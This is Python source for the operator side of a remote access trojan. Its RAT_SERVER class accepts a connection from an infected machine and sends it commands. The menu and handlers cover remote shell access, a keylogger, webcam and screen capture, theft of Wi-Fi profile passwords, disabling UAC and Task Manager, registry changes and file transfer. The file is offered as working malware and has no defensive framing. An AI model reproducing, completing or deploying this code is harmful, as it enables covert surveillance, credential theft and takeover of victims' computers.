import random
import socket
import os

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = None
        self.addr = None
        self.server_socket = None
        self.streaming_server = None

    def build_connection(self):
        """Establish a connection with the client."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print("[*] Waiting for the client...")
        self.client, self.addr = self.server_socket.accept()
        ipcli = self.client.recv(1024).decode()
        print(f"[*] Connection established successfully with {ipcli}")

    def start_streaming_server(self):
        """Start a streaming server for video or screen sharing."""
        try:
            from vidstream import StreamingServer
            self.streaming_server = StreamingServer(self.host, 8080)
            self.streaming_server.start_server()
        except ImportError:
            print("Module not found...")

    def stop_streaming_server(self):
        """Stop the streaming server."""
        if self.streaming_server:
            self.streaming_server.stop_server()

    def send_command(self, command):
        """Send a command to the client and receive the result."""
        self.client.send(command.encode())
        result_output = self.client.recv(1024).decode()
        print(result_output)

    def display_banner(self):
        """Display the available commands."""
        print("======================================================")
        print("                       Commands                       ")
        print("======================================================")
        print("System: ")
        print("======================================================")
        print(f'''
help                      all commands available
writein <text>            write the text to current opened window
browser                   enter query to browser
turnoffmon                turn off the monitor
turnonmon                 turn on the monitor
reboot                    reboot the system
drivers                   all drivers of PC
kill                      kill the system task
sendmessage               send messagebox with the text
cpu_cores                 number of CPU cores
systeminfo (extended)     all basic info about system (via cmd)
tasklist                  all system tasks
localtime                 current system time
curpid                    PID of client's process
sysinfo (shrinked)        basic info about system (Powers of Python)
shutdown                  shutdown client's PC
isuseradmin               check if user is admin
extendrights              extend system rights
disabletaskmgr            disable Task Manager
enabletaskmgr             enable Task Manager
disableUAC                disable UAC
monitors                  get all used monitors
geolocate                 get location of computer
volumeup                  increase system volume to 100%
volumedown                decrease system volume to 0%
setvalue                  set value in registry
delkey                    delete key in registry
createkey                 create key in registry
setwallpaper              set wallpaper
exit                      terminate the session of RAT
''')
        print("======================================================")
        print("Shell: ")
        print("======================================================")
        print(f'''
pwd                       get current working directory
shell                     execute commands via cmd
cd                        change directory
[Driver]:                 change current driver
cd ..                     change directory back
dir                       get all files of current directory
abspath                   get absolute path of files
''')
        print("======================================================")
        print("Network: ")
        print("======================================================")
        print(f'''
ipconfig                  local ip
portscan                  port scanner
profiles                  network profiles
profilepswd               password for profile
''')
        print("======================================================")
        print("Input devices: ")
        print("======================================================")
        print(f'''
keyscan_start             start keylogger
send_logs                 send captured keystrokes
stop_keylogger            stop keylogger
disable(--keyboard/--mouse/--all) 
enable(--keyboard/--mouse/--all)
''')
        print("======================================================")
        print("Video: ")
        print("======================================================")
        print(f'''
screenshare               oversee remote PC
webcam                    webcam video capture
breakstream               break webcam/screenshare stream
screenshot                capture screenshot
webcam_snap               capture webcam photo
''')
        print("======================================================")
        print("Files:")
        print("======================================================")
        print(f'''
delfile <file>            delete file
editfile <file> <text>    edit file
createfile <file>         create file
download <file> <homedir> download file
upload                    upload file
cp <file1> <file2>        copy file
mv <file> <path>          move file
searchfile <file> <dir>   search for file in mentioned directory
mkdir <dirname>           make directory
rmdir <dirname>           remove directory
startfile <file>          start file
readfile <file>           read from file
        ''')
        print("======================================================")

    def execute(self):
        """Main execution loop for handling commands."""
        self.display_banner()
        while True:
            command = input('Command >>  ')

            if command == 'shell':
                self.client.send(command.encode())
                while True:
                    command = str(input('>> '))
                    self.client.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = self.client.recv(1024).decode()
                    print(result_output)
                self.client.close()
                self.server_socket.close()

            elif command in ['drivers', 'disableUAC', 'reboot', 'volumeup', 'volumedown', 'monitors', 'extendrights', 'geolocate', 'turnoffmon', 'turnonmon', 'tasklist', 'ipconfig', 'cpu_cores', 'cd ..', 'dir', 'portscan', 'systeminfo', 'localtime', 'disabletaskmgr', 'enabletaskmgr', 'isuseradmin', 'help', 'sysinfo', 'pwd']:
                self.send_command(command)

            elif command.startswith('kill'):
                if len(command.split()) < 2:
                    print("No process mentioned to terminate")
                else:
                    self.send_command(command)

            elif command.startswith('writein'):
                if len(command.split()) < 2:
                    print("No text to output")
                else:
                    self.send_command(command)

            elif command.startswith('delfile'):
                if len(command.split()) < 2:
                    print("No file to delete")
                else:
                    self.send_command(command)

            elif command.startswith('createfile'):
                if len(command.split()) < 2:
                    print("No file to create")
                else:
                    self.send_command(command)

            elif command.startswith('cd'):
                if len(command.split()) < 2:
                    print("No directory")
                else:
                    self.send_command(command)

            elif command.startswith('abspath'):
                if len(command.split()) < 2:
                    print("No file")
                else:
                    self.send_command(command)

            elif command.startswith('readfile'):
                if len(command.split()) < 2:
                    print("No file to read")
                else:
                    self.client.send(command.encode())
                    result_output = self.client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_output)
                    print("===================================================")

            elif command.startswith('disable') or command.startswith('enable'):
                self.send_command(command)

            elif command.startswith('browser'):
                self.client.send(command.encode())
                query = str(input("Enter the query: "))
                self.client.send(query.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command.startswith('cp') or command.startswith('mv') or command.startswith('editfile'):
                self.send_command(command)

            elif command.startswith('mkdir') or command.startswith('rmdir'):
                if len(command.split()) < 2:
                    print("No directory name")
                else:
                    self.send_command(command)

            elif command.startswith('searchfile'):
                self.send_command(command)

            elif command.startswith('startfile'):
                if len(command.split()) < 2:
                    print("No file to launch")
                else:
                    self.send_command(command)

            elif command.startswith('download'):
                try:
                    self.client.send(command.encode())
                    file = self.client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except:
                    print("Not enough arguments")

            elif command == 'upload':
                self.client.send(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                with open(file, 'rb') as data:
                    filedata = data.read(2147483647)
                self.client.send(filename.encode())
                print("File has been sent")
                self.client.send(filedata)

            elif command == 'sendmessage':
                self.client.send(command.encode())
                text = str(input("Enter the text: "))
                self.client.send(text.encode())
                title = str(input("Enter the title: "))
                self.client.send(title.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'profilepswd':
                self.client.send(command.encode())
                profile = str(input("Enter the profile name: "))
                self.client.send(profile.encode())
                result_output = self.client.recv(2147483647).decode()
                print(result_output)

            elif command == 'profiles':
                self.send_command(command)

            elif command == 'setvalue':
                self.client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                key = str(input('Enter the key name: '))
                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
                self.client.send(const.encode())
                self.client.send(root.encode())
                self.client.send(key.encode())
                self.client.send(value.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'delkey':
                self.client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                self.client.send(const.encode())
                self.client.send(root.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'createkey':
                self.client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                self.client.send(const.encode())
                self.client.send(root.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'setwallpaper':
                self.client.send(command.encode())
                text = str(input("Enter the filename: "))
                self.client.send(text.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'keyscan_start':
                self.client.send(command.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'send_logs':
                self.client.send(command.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'stop_keylogger':
                self.client.send(command.encode())
                result_output = self.client.recv(1024).decode()
                print(result_output)

            elif command == 'screenshare' or command == 'webcam':
                self.client.send(command.encode("utf-8"))
                self.start_streaming_server()

            elif command == 'breakstream':
                self.stop_streaming_server()

            elif command == 'screenshot':
                self.client.send(command.encode())
                file = self.client.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111, 99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                    f.close()
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")

            elif command == 'webcam_snap':
                self.client.send(command.encode())
                file = self.client.recv(2147483647)
                with open(f'{os.getcwd()}\\{random.randint(11111, 99999)}.png', 'wb') as f:
                    f.write(file)
                    f.close()
                print("File is downloaded")

            elif command == 'exit':
                self.client.send(command.encode())
                output = self.client.recv(1024)
                output = output.decode()
                print(output)
                self.server_socket.close()
                self.client.close()
                break

if __name__ == '__main__':
    rat = RAT_SERVER('127.0.0.1', 4444)
    rat.build_connection()
    rat.execute()